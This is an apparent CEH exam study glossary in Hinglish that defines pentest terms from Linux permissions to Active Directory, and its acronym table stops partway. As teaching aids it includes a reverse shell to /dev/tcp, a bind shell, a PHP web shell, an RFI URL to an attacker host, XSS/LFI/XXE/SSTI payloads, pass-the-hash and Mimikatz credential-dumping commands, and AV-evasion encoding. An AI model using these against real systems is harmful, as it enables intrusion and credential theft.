# 📖 Glossary — Hinglish

> Saari weird CEH/pentest terminology ek jagah, simple Hinglish mein. Ctrl+F karo aur turant samjho.
> Har term: **kya hai → kahan dikhega → example**.

## 📑 Categories (jump links)

- [File Permissions & Linux Basics](#-file-permissions--linux-basics)
- [Networking Basics](#-networking-basics)
- [Ports & Services](#-ports--services)
- [Authentication & Hashes](#-authentication--hashes)
- [Cryptography](#-cryptography)
- [Web Attacks](#-web-attacks)
- [Active Directory / Windows](#-active-directory--windows)
- [Exploitation Concepts](#-exploitation-concepts)
- [Shell Types & Payloads](#-shell-types--payloads)
- [Wireless](#-wireless)
- [Sniffing & MITM](#-sniffing--mitm)
- [Malware Analysis](#-malware-analysis)
- [Vulnerabilities & CVE](#-vulnerabilities--cve)
- [Pentest Phases](#-pentest-phases)
- [Tool-specific Jargon](#-tool-specific-jargon)
- [Acronyms Cheat Sheet](#-acronyms-cheat-sheet)

---

## 🐧 File Permissions & Linux Basics

### SUID (Set User ID)
Ek special file permission Linux mein. Jab kisi binary pe SUID set hota hai, woh **owner ke privileges** ke saath chalti hai, na ki current user ke. Agar owner `root` hai, toh us binary ko koi bhi user chalaye, woh **root ke rights** ke saath chalegi.

**Kahan dikhega:** privesc questions mein. "Find SUID binaries" → ye implies ki tumhe ek SUID binary dhundni hai jo abuse ho sake.

**Example:**
```bash
find / -perm -4000 2>/dev/null
# Common SUID binaries to abuse: nmap, vim, find, bash, more, less, nano, cp
```

**Visual indicator:** `ls -la` mein owner ke `x` ki jagah `s` dikhe → SUID set hai.
```
-rwsr-xr-x  1 root root  ...  /usr/bin/vulnerable
   ↑
   's' instead of 'x' = SUID
```

**Privesc trick:** GTFOBins (https://gtfobins.github.io/) check karo — list of SUID binaries jo abuse ho sakte hain.

---

### SGID (Set Group ID)
SUID jaisa hi, but **group privileges** ke liye. Binary group ke rights se chalti hai.

**Visual:** group `x` ki jagah `s`:
```
-rwxr-sr-x  1 user mygroup  ...
```

---

### Sticky bit
Folder pe lagta hai. Matlab: **sirf file owner apni file delete kar sakta hai** us folder mein, even if folder writable hai. Common on `/tmp`.

**Visual:** `t` at the end:
```
drwxrwxrwt  ... /tmp
            ↑ sticky bit
```

---

### chmod / chown
- `chmod` = change permissions (`chmod 755 file.sh`)
- `chown` = change owner (`chown user:group file.sh`)

**Number meaning:**
- 4 = read (r)
- 2 = write (w)
- 1 = execute (x)
- 7 = rwx, 6 = rw-, 5 = r-x, etc.

`755` = owner rwx, group rx, others rx.

---

### sudo / su
- `sudo command` = run command as root (or another user)
- `su - user` = switch user
- `sudo -l` = see what commands current user can run as root **without password** (common privesc check)

---

### /etc/passwd vs /etc/shadow
- `/etc/passwd` = list of all users (readable by anyone). Format: `user:x:UID:GID:info:home:shell`
- `/etc/shadow` = password hashes (only root can read). Format: `user:$6$salt$hash:...`

**Privesc target:** `/etc/shadow` access = crack hash = root.

---

### UID / GID
- UID = User ID. `0 = root`. Other users start from 1000.
- GID = Group ID. Same logic.

`uid=0` in `id` output = you're root.

---

### Bash basics for exam
```bash
ls -la              # detailed list
cat file            # print file
grep "text" file    # search in file
find / -name "*.txt"  # find files
which command       # where is command
echo $PATH          # show PATH variable
history             # command history (sometimes has secrets!)
```

---

## 🌐 Networking Basics

### TCP vs UDP
- **TCP** = reliable, connection-oriented. 3-way handshake. Used by HTTP, SSH, FTP.
- **UDP** = fast, no handshake, no guarantee. Used by DNS, SNMP, TFTP, NTP.

**Why it matters:** nmap mein `-sS` is TCP SYN scan, `-sU` is UDP scan. UDP scans are slow.

---

### Three-way handshake (TCP)
TCP connection start hone ka tarika:
1. Client → Server: **SYN** (mai connect karna chahta hu)
2. Server → Client: **SYN-ACK** (theek hai, mai bhi)
3. Client → Server: **ACK** (confirmed)

**Why it matters:** SYN flood attack = step 1 spam karke server ko thaka dena.

---

### Port
Ek socket pe service identify karne ka number (0-65535).
- 0-1023 = "well-known" ports (need root to bind)
- 1024-49151 = registered
- 49152-65535 = ephemeral/dynamic

**Service ↔ port mapping:** common ones in [Ports & Services](#-ports--services) section below.

---

### Socket
IP + Port combo. E.g. `10.10.10.5:80` = HTTP service on that machine.

---

### Three port states (nmap)
- **open** = service listening
- **closed** = no service, but host responding
- **filtered** = firewall blocking, no response

---

### ICMP
"Internet Control Message Protocol". Used by `ping`, traceroute, error messages. Often **blocked by firewalls**, which is why `nmap -Pn` exists (skip ICMP ping).

---

### ARP (Address Resolution Protocol)
Maps IP address → MAC address on local network. Only works on same LAN.

**Used in:** ARP spoofing (MITM attack), nmap `-PR` (ARP ping, fastest on LAN).

---

### MAC address
Hardware address of network interface. 6 bytes, e.g. `00:1A:2B:3C:4D:5E`. First 3 bytes = OUI (vendor identifier).

---

### Subnet / CIDR
- `/24` = 256 IPs (e.g. 10.10.10.0 to 10.10.10.255)
- `/16` = 65536 IPs
- `/32` = single IP

CIDR notation: `<base IP>/<bits>`.

---

### NAT (Network Address Translation)
Multiple internal IPs share one external IP. Why your phone and laptop both have `192.168.x.x` but appear as one IP to the internet.

---

### DNS
"Domain Name System" — domain → IP resolution.
- **A record** = IPv4
- **AAAA record** = IPv6
- **MX record** = mail server
- **NS record** = name server
- **TXT record** = text (SPF, DMARC, verification)
- **CNAME** = alias
- **AXFR** = zone transfer (full DNS dump — usually blocked, but if allowed = goldmine)

---

### Reverse DNS / PTR
Reverse of normal DNS — IP → hostname. `dig -x 10.10.10.5`.

---

### Banner grabbing
Connecting to a service and reading the welcome message ("banner") to identify version.
```bash
nc 10.10.10.5 21      # FTP banner
curl -I http://target  # HTTP headers
```

---

## 🔌 Ports & Services

| Port | Protocol | Service | Note |
|---|---|---|---|
| 20/21 | TCP | FTP | data/control |
| 22 | TCP | SSH | |
| 23 | TCP | Telnet | unencrypted! |
| 25 | TCP | SMTP | mail |
| 53 | TCP/UDP | DNS | |
| 67/68 | UDP | DHCP | |
| 69 | UDP | TFTP | trivial FTP, often anonymous |
| 80 | TCP | HTTP | |
| 88 | TCP | Kerberos | **Domain Controller indicator** |
| 110 | TCP | POP3 | mail receive |
| 111 | TCP | RPCbind | NFS related |
| 123 | UDP | NTP | time sync |
| 135 | TCP | MSRPC | Windows RPC |
| 137-139 | TCP/UDP | NetBIOS | Windows file sharing (old) |
| 143 | TCP | IMAP | mail |
| 161/162 | UDP | SNMP | network mgmt |
| 389 | TCP | LDAP | directory (AD) |
| 443 | TCP | HTTPS | |
| 445 | TCP | SMB | Windows shares (modern) |
| 500 | UDP | IKE | IPsec VPN |
| 514 | UDP | Syslog | |
| 587 | TCP | SMTP submission | |
| 636 | TCP | LDAPS | LDAP over SSL |
| 873 | TCP | rsync | |
| 1433 | TCP | MSSQL | Microsoft SQL Server |
| 1521 | TCP | Oracle DB | |
| 2049 | TCP | NFS | Linux file share |
| 2222 | TCP | SSH (alt) | |
| 3306 | TCP | MySQL | |
| 3389 | TCP | RDP | Windows remote desktop |
| 5432 | TCP | PostgreSQL | |
| 5900 | TCP | VNC | |
| 5985/5986 | TCP | WinRM | Windows remote shell (PowerShell) |
| 6379 | TCP | Redis | often unauth! |
| 8080/8443 | TCP | HTTP/HTTPS alt | |
| 27017 | TCP | MongoDB | often unauth! |

**Memorize at least:** 21, 22, 25, 53, 80, 88, 110, 135, 139, 143, 161, 389, 443, 445, 1433, 3306, 3389, 5985.

---

## 🔐 Authentication & Hashes

### Hash
One-way function. Input → fixed-length string. **Cannot be reversed mathematically** — only cracked by guessing.

Examples:
- `password` → MD5: `5f4dcc3b5aa765d61d8327deb882cf99`
- Same input always → same hash (deterministic)
- Different input → different hash (collision-resistant)

---

### Salt
Random data added to password **before** hashing. Prevents same passwords producing same hashes (defeats rainbow tables).

```
hash("password" + "randomsalt123") → unique hash
```

Modern hashes (bcrypt, Argon2) include salt. Old ones (MD5, SHA1) don't.

---

### Common hash types

| Hash | Length | Recognize | Crack mode |
|---|---|---|---|
| **MD5** | 32 hex chars | `5f4dcc3b5aa765d61d8327deb882cf99` | hashcat 0 |
| **SHA1** | 40 hex chars | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | hashcat 100 |
| **SHA256** | 64 hex chars | | hashcat 1400 |
| **NTLM** | 32 hex chars | `8846f7eaee8fb117ad06bdd830b7586c` | hashcat 1000 |
| **LM** | 32 hex chars | usually paired with NTLM, deprecated | hashcat 3000 |
| **NTLMv2** | longer, has `::` | `user::DOMAIN:...:..:..` | hashcat 5600 |
| **Net-NTLMv1** | | `user::DOMAIN:..:..:..` | hashcat 5500 |
| **bcrypt** | starts with `$2a$`, `$2y$` | `$2a$10$...` | hashcat 3200 |
| **sha512crypt** | starts with `$6$` | from `/etc/shadow` | hashcat 1800 |
| **md5crypt** | starts with `$1$` | from `/etc/shadow` | hashcat 500 |
| **MySQL** | starts with `*` | `*A4B6157319038724E3560894F7F932C8886EBFCF` | hashcat 300 |
| **Kerberos AS-REP** | starts with `$krb5asrep$` | | hashcat 18200 |
| **Kerberos TGS** | starts with `$krb5tgs$` | | hashcat 13100 |

**Identify a hash:** `hashid <hash>` ya online: https://hashes.com/en/tools/hash_identifier

---

### NTLM
Microsoft's password hashing. Used in Windows logins, SMB, etc. **Easy to crack** with hashcat (`-m 1000`) — millions/sec on GPU.

NTLM hash = unsalted MD4 of UTF-16 password.

**Pass-the-hash:** Tum NTLM hash use kar sakte ho **without cracking** — directly authenticate to SMB/WinRM.

---

### Pass-the-Hash (PtH)
Authentication trick where you use the **NTLM hash directly** to log in, instead of the plaintext password. Windows accepts the hash as if it were the password.

**Tool:** crackmapexec, impacket-psexec, evil-winrm `-H`.
```bash
crackmapexec smb 10.10.10.5 -u admin -H aad3b435...:8846f7ea...
evil-winrm -i 10.10.10.5 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c
```

---

### Pass-the-Ticket
Same idea but for Kerberos tickets instead of NTLM hashes.

---

### Rainbow table
Precomputed hash database. Lookup hash → get plaintext. **Only works on unsalted hashes** (MD5, SHA1, NTLM). CrackStation uses these.

---

### Dictionary attack vs Brute force vs Hybrid
- **Dictionary** = try words from a wordlist (e.g. rockyou.txt). Fast, finds common passwords.
- **Brute force** = try EVERY combination. Slow but guaranteed eventually.
- **Hybrid** = wordlist + rules (e.g. add numbers, capitalize, append year).

In hashcat:
- `-a 0` = dictionary
- `-a 3` = brute force / mask
- `-a 6/7` = hybrid

---

### Mask attack
Brute force with pattern. E.g. `?u?l?l?l?l?d?d` = 1 upper + 4 lower + 2 digits.
```
?l = lowercase letter
?u = uppercase letter
?d = digit
?s = symbol
?a = all
```

---

### NTDS.dit
Windows AD database file. Contains **all domain user hashes**. Located at `C:\Windows\NTDS\NTDS.dit`. Dumped via `secretsdump.py`.

---

### SAM file
Windows local accounts database. `C:\Windows\System32\config\SAM`. Local NTLM hashes.

---

### LSASS
"Local Security Authority Subsystem" — Windows process holding **plaintext passwords / NTLM hashes in memory**. Mimikatz dumps it.

---

## 🔒 Cryptography

### Symmetric vs Asymmetric

**Symmetric:** Same key for encrypt + decrypt. Fast.
- Examples: AES, DES, 3DES, Blowfish, RC4

**Asymmetric:** Public key + private key pair. Slow but enables exchange.
- Examples: RSA, DSA, ECC, Diffie-Hellman

---

### AES (Advanced Encryption Standard)
Modern symmetric cipher. 128/192/256 bit keys. Used by SSL/TLS, file encryption, VPNs.

**Modes:** AES-CBC, AES-ECB, AES-GCM, etc. (mode = how blocks are chained).

---

### RSA
Asymmetric cipher. Uses **two large primes** (`p`, `q`) → modulus `N = p*q`. Public key = `(N, e)`, private key = `(N, d)`.

**Attack:** If `N` can be factored → private key recoverable. Use http://factordb.com/ for known factorizations.

---

### IV (Initialization Vector)
Random value used with symmetric ciphers in CBC/CTR modes. Ensures same plaintext + same key produces different ciphertext.

**Important:** IV is NOT secret, but must be unique per encryption.

---

### Block cipher mode (CBC, ECB, GCM)
- **ECB** (Electronic Code Book) = simplest, **insecure** (same blocks → same cipher → patterns leak)
- **CBC** (Cipher Block Chaining) = each block XOR'd with previous. Needs IV.
- **GCM** = authenticated encryption. Modern preferred.

---

### Hashing vs Encryption
- **Hashing** = one-way (cannot reverse)
- **Encryption** = two-way (with key, you can decrypt)

Passwords are HASHED. Files are ENCRYPTED.

---

### HMAC
Hash + secret key. Used to verify integrity AND authenticity of data. E.g. JWT signature.

---

### TLS / SSL
"Transport Layer Security" / "Secure Sockets Layer". Protocol that encrypts HTTP → HTTPS. Uses **both** asymmetric (key exchange) + symmetric (data).

---

### Certificate
Document that binds a public key to an identity (e.g. domain name). Signed by a CA.

---

### Steganography
Hiding data **inside** other data (image, audio). Different from encryption (which makes data look random) — stego makes data look **innocent**.

**Common in CEH:** Hidden text in JPG/PNG via `steghide`, hidden files via `binwalk`, GPS in EXIF via `exiftool`.

---

## 🌍 Web Attacks

### XSS (Cross-Site Scripting)
Attacker injects JavaScript into a web page, which runs in **other users'** browsers.

**Types:**
- **Reflected** = payload in URL, instant
- **Stored** = payload saved in DB, runs every visit
- **DOM-based** = JavaScript modifies the page based on URL

**Common payload:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

### CSRF (Cross-Site Request Forgery)
Attacker tricks **logged-in** user's browser into making a request to a site they're authenticated to. E.g. a malicious page submits a form to your bank.

**Defense:** CSRF tokens (random per-request).

---

### SSRF (Server-Side Request Forgery)
You make the **server** fetch a URL on your behalf. Useful to access internal services (`http://localhost/admin`, AWS metadata `http://169.254.169.254/`).

---

### LFI (Local File Inclusion)
Web app reads a file based on user input → you can read **other files** by manipulating the path.

**Payload:**
```
http://target/page.php?file=../../../../etc/passwd
```

**Linux targets:** `/etc/passwd`, `/etc/shadow`, `/var/www/html/config.php`, `/proc/self/environ`
**Windows targets:** `C:\Windows\win.ini`, `C:\inetpub\...`

**PHP filter trick:**
```
?file=php://filter/convert.base64-encode/resource=index.php
```
Returns base64-encoded source code of any PHP file.

---

### RFI (Remote File Inclusion)
Like LFI but include from **remote URL**:
```
?file=http://attacker/shell.txt
```
Result: server executes attacker's PHP. Less common (most servers block this).

---

### SQL Injection (SQLi)
You inject SQL into a query parameter. Example:

App code:
```sql
SELECT * FROM users WHERE id=$id
```

You send: `id=1 OR 1=1` → returns all users.
Or: `id=1 UNION SELECT username,password FROM admins`

**Tool:** sqlmap (handles 95% of cases automatically).

**Types:**
- **In-band / Union-based** = data comes back in the response
- **Blind** = no data in response, infer from yes/no behavior
- **Time-based blind** = infer from response delays

---

### Command Injection
Web app passes user input to a shell command unsafely:
```
ping -c 4 $userInput
```
You send: `8.8.8.8; cat /etc/passwd` → shell runs both commands.

---

### IDOR (Insecure Direct Object Reference)
URL has a sequential ID, no auth check:
```
/user/profile?id=42  ← your profile
/user/profile?id=43  ← someone else's, no permission check
```

---

### Path Traversal
Same idea as LFI but for any file the web server can read:
```
http://target/download?file=../../../../etc/passwd
```

---

### File Upload Vuln
Upload form accepts dangerous file types (e.g. `.php`, `.jsp`) → upload web shell → execute commands.

**Bypass tricks:**
- Rename `shell.php` → `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- Magic bytes: prepend JPEG header to PHP file
- Case: `shell.PHp`

---

### Web Shell
A script (PHP, ASP, JSP) that lets you run commands via HTTP:
```php
<?php system($_GET['cmd']); ?>
```
Visit: `http://target/shell.php?cmd=whoami`

---

### Reverse Shell vs Bind Shell
- **Bind shell** = victim opens a port, you connect to it
- **Reverse shell** = victim connects back to YOUR listener (works through NAT/firewall)

---

### XXE (XML External Entity)
XML parser interprets external entities → can read local files or do SSRF:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

### SSTI (Server-Side Template Injection)
Web app renders user input via template engine (Jinja2, Twig). You inject template syntax → RCE.

```
{{7*7}}  → if shows 49, vulnerable
{{config}}  → leaks Flask config
{{"".__class__.__mro__[1].__subclasses__()...}}  → RCE
```

---

### JWT (JSON Web Token)
Token format: `header.payload.signature`. Used for stateless auth.

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

**Attacks:**
- `alg=none` → strip signature, server accepts
- Weak HS256 secret → crack with hashcat (mode 16500)
- Public key confusion (RS256 → HS256)

→ JWT.io decodes them in browser

---

### CORS (Cross-Origin Resource Sharing)
Browser security feature. A site can declare which other origins can access its resources. Misconfig → data leak.

---

## 🪟 Active Directory / Windows

### Domain Controller (DC)
A Windows server that **runs** Active Directory. Holds the user database, enforces policies, hands out Kerberos tickets.

**Identifier:** Open ports 88 (Kerberos) + 389 (LDAP) + 445 (SMB) on a Windows host.

---

### Active Directory (AD)
Microsoft's directory service. Stores users, computers, groups, policies for an organization. Authentication based on Kerberos.

---

### Domain / Forest
- **Domain** = a security boundary in AD (e.g. `corp.local`)
- **Forest** = collection of domains that share schema

---

### Kerberos
Microsoft's authentication protocol. Uses **tickets** (TGTs and TGSs).

**Flow:**
1. User → DC: "Mai authentic hu" (provides hashed password)
2. DC → User: TGT (Ticket Granting Ticket)
3. User → DC: "Mujhe service X ka access chahiye" (with TGT)
4. DC → User: TGS (Ticket Granting Service) for service X
5. User → Service X: TGS → access granted

---

### TGT (Ticket Granting Ticket)
The "master ticket" you get from the DC after initial auth. Lets you ask for service tickets later without re-authenticating.

---

### TGS (Ticket Granting Service ticket)
Per-service ticket. You present it to the service to authenticate.

---

### Kerberoasting
Attack: Request TGS for a service account → DC encrypts it with service account's password hash → you crack it offline.

**Tool:** `impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -request`
**Crack:** hashcat mode 13100

---

### AS-REP Roasting
Attack: If a user has "**Do not require Kerberos preauthentication**" enabled, you can request their AS-REP without knowing their password → crack offline.

**Tool:** `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass`
**Crack:** hashcat mode 18200

---

### Golden Ticket
You forged TGT using `krbtgt` account hash → can impersonate ANY user, indefinite. Endgame attack.

---

### Silver Ticket
Forged TGS for one specific service. Less powerful than Golden but harder to detect.

---

### NetNTLMv1 / NetNTLMv2
Network-based NTLM authentication challenges. Not the same as plain NTLM hashes — these include challenge-response.

**Captured by:** Responder (LLMNR/NBT-NS poisoning).
**Crack:** hashcat 5500 (v1) / 5600 (v2).

---

### Responder / LLMNR poisoning
You sit on a network and respond to LLMNR/NBT-NS broadcasts pretending to be the resource the victim is looking for. Victim then sends their NTLM hash to you.

---

### SMB (Server Message Block)
Windows file/printer sharing protocol. Port 445.
- SMBv1 = old, vulnerable (EternalBlue)
- SMBv2/v3 = modern

**Tools:** smbclient, smbmap, enum4linux, crackmapexec.

---

### SMB Shares
Folders shared over SMB. Common ones:
- `C$`, `ADMIN$` = admin shares (need admin access)
- `IPC$` = inter-process (used for null sessions)
- Custom shares = whatever sysadmin made

---

### Null session
Connecting to SMB without credentials. On old systems, lets you enumerate users/shares without auth.
```bash
smbclient -L //10.10.10.5/ -N
enum4linux -a 10.10.10.5
```

---

### SID
"Security Identifier" — Windows user/group ID. Format: `S-1-5-21-...-XXXX`. Last number `500` = Administrator.

---

### GPO (Group Policy Object)
AD policy that applies settings to users/computers (e.g. "all PCs must have screensaver after 5 min"). Misconfigured GPOs = privesc.

---

### LSASS
Process holding plaintext credentials in memory. Mimikatz target.

---

### Mimikatz
Tool to dump plaintext passwords, NTLM hashes, Kerberos tickets from LSASS.
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

---

### BloodHound
Tool that maps AD relationships in a graph DB (Neo4j). Shows attack paths from "any user" to "Domain Admin".

---

## 💥 Exploitation Concepts

### Vulnerability
A weakness in software/config that can be abused.

---

### Exploit
Code that takes advantage of a vulnerability to do something unintended (RCE, info leak, crash).

---

### Payload
The "what to do after" the exploit lands. E.g. spawn shell, add user, download file.

---

### Shellcode
Raw machine code (CPU instructions) used as payload. Often hex-encoded.

---

### RCE (Remote Code Execution)
Highest-impact bug type. You can run **arbitrary code** on the target remotely.

---

### LPE (Local Privilege Escalation)
You're already on the system as a low-priv user. Now you escalate to root/admin.

---

### Privilege Escalation (Privesc)
Going from low → high privileges. **Linux:** SUID abuse, sudo misconfig, kernel exploit. **Windows:** unquoted service paths, weak service perms, token impersonation, kernel.

---

### Lateral Movement
After initial foothold, moving to OTHER machines on the same network. Tools: psexec, wmiexec, evil-winrm, pass-the-hash.

---

### Pivoting
Using one compromised machine as a relay to reach **internal** networks not directly accessible to you.

**Tools:** ssh `-L`/`-R` tunnels, chisel, ligolo-ng, metasploit's `route add`.

---

### Persistence
Ensuring you keep access even after reboot/cleanup. E.g. add cron job, service, scheduled task, registry run key.

---

### Foothold
Initial access to a target. The first shell. Often the hardest step.

---

### Post-Exploitation
Everything after foothold: privesc, persistence, lateral movement, exfil.

---

### Backdoor
A way back in for later. E.g. SSH key added to authorized_keys, hidden user, web shell.

---

### Buffer Overflow
You write **more data** than a buffer can hold → overflow into adjacent memory → can hijack control flow → execute attacker's shellcode.

**Stack overflow:** classic. **Heap overflow:** harder.

---

### ASLR / DEP / Stack Canary
Defenses against buffer overflows.
- **ASLR** = randomize memory addresses
- **DEP/NX** = mark stack/heap non-executable
- **Stack canary** = random value before return address; checked before return

---

## 🐚 Shell Types & Payloads

### Reverse Shell
Victim connects back to YOUR listener.

**Why preferred:** works through NAT, firewalls usually allow outbound.

**Listener (you):**
```bash
nc -lvnp 4444
```

**Victim:**
```bash
bash -i >& /dev/tcp/10.10.10.X/4444 0>&1
```

---

### Bind Shell
Victim opens a port, you connect to it.

**Victim:**
```bash
nc -lvnp 4444 -e /bin/bash
```

**You:**
```bash
nc 10.10.10.5 4444
```

---

### Web Shell
A script (PHP/ASP/JSP) that runs commands via HTTP. See [File Upload Vuln](#file-upload-vuln).

---

### Meterpreter
Metasploit's advanced payload. Encrypted, in-memory, supports many commands (file ops, screenshot, hashdump, port forward, etc.).

```
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > shell
```

---

### Listener / Handler
Your tool that receives the reverse shell connection.
- `nc -lvnp 4444` — basic
- `multi/handler` in Metasploit — for meterpreter payloads

---

### Stager / Stage
Many payloads come in 2 parts:
- **Stager** = small initial shellcode that downloads the real payload
- **Stage** = the full payload (e.g. meterpreter)

---

### Encoder
Tool that obfuscates a payload to bypass simple AV signatures.
```
msfvenom -p ... -e x86/shikata_ga_nai -i 5 ...
```

---

## 📶 Wireless

### SSID / ESSID
Network name. "ESSID" is the technical term, "SSID" is the common one.

---

### BSSID
MAC address of the AP (Access Point). Unique per AP.

---

### Channel
Radio frequency used. WiFi has channels 1-14 (2.4GHz) and 36-165 (5GHz).

---

### Monitor mode
Special wireless mode that captures **all** WiFi packets nearby (not just yours). Required for sniffing/cracking.

```bash
sudo airmon-ng start wlan0   # → wlan0mon
```

---

### WEP
Old, broken WiFi encryption. Crackable in minutes via IV collection + statistical attack.

---

### WPA / WPA2 / WPA3
Modern WiFi encryption.
- WPA = old TKIP
- WPA2 = AES, common
- WPA3 = newest, harder to attack

---

### 4-way handshake
The auth exchange between client and AP when connecting to WPA. **Capturing this** lets you crack the WPA password offline.

---

### Deauth attack
Send fake deauth packets to a client → forces it to reconnect → you capture handshake.
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

---

### PMKID
Modern way to extract a hash for cracking, **without needing a connected client**. Easier than full handshake.

---

### Hidden SSID
Network that doesn't broadcast its name. **Not security** — name visible during connect attempts. Use `--essid <length>` or wait for client connect.

---

### WPS
"WiFi Protected Setup" — push-button connect feature. Insecure PIN system, attackable with `reaver`.

---

## 📡 Sniffing & MITM

### Sniffing
Capturing network traffic. Active (you forward) or passive (just listen).

---

### MITM (Man-in-the-Middle)
You sit between two parties, intercept and possibly modify their traffic.

**Tools:** ettercap, bettercap, mitmproxy.

---

### ARP Spoofing / Poisoning
Send fake ARP replies → trick victim into sending you their traffic → MITM. Works on LAN.

---

### DNS Spoofing
Reply to DNS queries with fake IPs → redirect victim to your server.

---

### SSL Stripping
MITM trick: downgrade HTTPS to HTTP by intercepting redirects. Modern browsers (HSTS) defeat this.

---

### Promiscuous mode
NIC mode that captures all packets on the wire (not just ones addressed to you). Required for sniffing.

---

### pcap
"Packet Capture" file format. Wireshark/tcpdump save and read these.

---

## 🦠 Malware Analysis

### PE (Portable Executable)
Windows binary format (`.exe`, `.dll`). Analysis tools: PEview, peframe, strings.

---

### ELF
Linux binary format. Analyzed with `readelf`, `objdump`, `strings`.

---

### Static analysis
Analyzing a file **without running it** (strings, hex, decompile).

---

### Dynamic analysis
Running the file in a **sandbox** and observing behavior (network, files, registry).

---

### Packed binary
Binary that's been compressed/encrypted to hide its real content. Common packers: UPX, ASPack. Detected by entropy + signatures.

---

### Yara rule
Pattern-matching rule for malware. Like a signature: "if file contains string X and Y but not Z, flag as Foo malware".

---

### IOC (Indicator of Compromise)
Forensic artifacts that indicate intrusion: hashes, IPs, domains, registry keys, file paths.

---

### C2 / C&C (Command and Control)
The attacker's server that malware talks to. Find the C2 = identify the infection.

---

## ⚠️ Vulnerabilities & CVE

### CVE
"Common Vulnerabilities and Exposures" — global ID for a public vulnerability. Format: `CVE-YYYY-NNNNN`.

E.g. `CVE-2017-0144` = EternalBlue.

---

### CVSS
"Common Vulnerability Scoring System" — 0-10 severity score.
- 0-3.9 = Low
- 4.0-6.9 = Medium
- 7.0-8.9 = High
- 9.0-10 = Critical

---

### EternalBlue (MS17-010)
Famous SMB vulnerability in Windows. WannaCry used this. Metasploit has a stable exploit.

```
exploit/windows/smb/ms17_010_eternalblue
```

---

### Common CVEs CEH might ask

| CVE / Name | Service / Product |
|---|---|
| CVE-2017-0144 / MS17-010 / EternalBlue | SMBv1 |
| CVE-2008-4250 / MS08-067 | Windows RPC |
| CVE-2014-6271 / Shellshock | Bash |
| CVE-2014-0160 / Heartbleed | OpenSSL |
| CVE-2011-2523 | vsftpd 2.3.4 backdoor |
| CVE-2018-7600 / Drupalgeddon2 | Drupal |
| CVE-2017-5638 | Apache Struts |
| CVE-2021-41773 | Apache 2.4.49 path traversal |
| CVE-2021-44228 / Log4Shell | Log4j |
| CVE-2021-4034 / PwnKit | polkit Linux privesc |
| CVE-2016-5195 / DirtyCow | Linux kernel |

---

### Zero-day (0day)
Vulnerability that's not yet publicly known/patched. Most valuable.

---

### Public exploit
Published code (Exploit-DB, Metasploit) that exploits a known CVE.

---

## 🔁 Pentest Phases

### 1. Recon (Footprinting)
Passive info gathering. Whois, DNS, Google dorks, social media. Target doesn't know you exist.

### 2. Scanning
Active probing. nmap, masscan. Find open ports, services.

### 3. Enumeration
Deep service interrogation. SMB shares, SNMP, LDAP, web dirs.

### 4. Vulnerability Analysis
Map findings to known vulns. nikto, searchsploit, CVE lookups.

### 5. Exploitation
Get initial access (foothold).

### 6. Post-exploitation
Privesc, lateral movement, persistence, exfil, cover tracks.

### 7. Reporting
Document findings.

---

## 🛠 Tool-specific Jargon

### nmap "filtered" vs "closed"
- **closed** = port responding "no service here" (RST packet)
- **filtered** = no response at all (firewall dropped it silently)

---

### NSE (Nmap Scripting Engine)
Lua scripts that extend nmap. Categories: auth, brute, default, discovery, exploit, intrusive, vuln, etc.
```bash
nmap --script vuln <IP>
nmap --script "smb-vuln-*" -p 445 <IP>
```

---

### Metasploit "use" vs "set"
- `use <module>` = load a module
- `set OPTION value` = configure the loaded module
- `setg OPTION value` = global set (persists across modules)
- `run` / `exploit` = execute

---

### Sqlmap "tamper script"
Pre-built script that obfuscates the SQL injection payload to bypass WAFs.
```bash
sqlmap -u URL --tamper=space2comment
```

---

### Hydra http-form syntax
The intimidating one:
```bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
- `^USER^` / `^PASS^` = where to inject
- `F=` = failure indicator (string in response when wrong)
- `S=` = success indicator (use either F or S)

---

### Wordlist
Plain text file of password/username/dir guesses. Most famous: `rockyou.txt`.

---

### Rockyou
The most famous password wordlist (14M passwords from a 2009 breach). On Parrot: `/usr/share/wordlists/rockyou.txt`.

---

### Dictionary (CEH wordlist meaning)
Same as wordlist.

---

### Bruteforce
Trying every possibility (vs dictionary which tries a list).

---

## 🔤 Acronyms Cheat Sheet

| Acronym | Full form |
|---|---|
| **AD** | Active Directory |
| **AES** | Advanced Encryption Standard |
| **AP** | Access Point (WiFi) |
| **APT** | Advanced Persistent Threat |
| **ARP** | Address Resolution Protocol |
| **AV** | Antivirus |
| **BSSID** | Basic Service Set Identifier (AP MAC) |
| **C2 / C&C** | Command and Control |
| **CIA** | Confidentiality, Integrity, Availability |
| **CSRF** | Cross-Site Request Forgery |
| **CVE** | Common Vulnerabilities and Exposures |
| **CVSS** | Common Vulnerability Scoring System |
| **DC** | Domain Controller |
| **DDoS** | Distributed Denial of Service |
| **DEP** | Data Execution Prevention |
| **DLL** | Dynamic Link Library |
| **DMZ** | Demilitarized Zone (network) |
| **DNS** | Domain Name System |
| **DoS** | Denial of Service |
| **EDR** | Endpoint Detection and Response |
| **ESSID** | Extended Service Set Identifier |
| **FQDN** | Fully Qualified Domain Name |
| **FTP** | File Transfer Protocol |
| **GPO** | Group Policy Object |
| **HIDS** | Host Intrusion Detection System |
| **HTTP/S** | Hypertext Transfer Protocol / Secure |
| **ICMP** | Internet Control Message Protocol |
| **IDOR** | Insecure Direct Object Reference |
| **IDS / IPS** | Intrusion Detection / Prevention System |
| **IoC** | Indicator of Compromise |
| **IoT** | Internet of Things |
| **IV** | Initialization Vector |
| **JWT** | JSON Web Token |
| **LDAP** | Lightweight Directory Access Protocol |
| **LFI** | Local File Inclusion |
| **LLMNR** | Link-Local Multicast Name Resolution |
| **LM** | LAN Manager (old hash) |
| **LPE** | Local Privilege Escalation |
| **MAC** | Media Access Control (network) |
| **MFA** | Multi-Factor Authentication |
